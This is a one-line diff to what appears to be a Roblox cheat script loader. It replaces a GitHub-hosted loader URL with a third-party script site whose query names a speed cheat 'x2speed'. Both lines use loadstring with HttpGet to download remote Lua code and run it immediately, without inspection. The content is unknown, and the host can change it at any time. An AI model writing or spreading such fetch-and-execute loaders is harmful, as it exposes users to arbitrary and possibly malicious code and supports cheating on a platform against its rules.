@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/enzukaix/Syscall/refs/heads/main/Loader.lua"))()
+loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=x2speed"))()
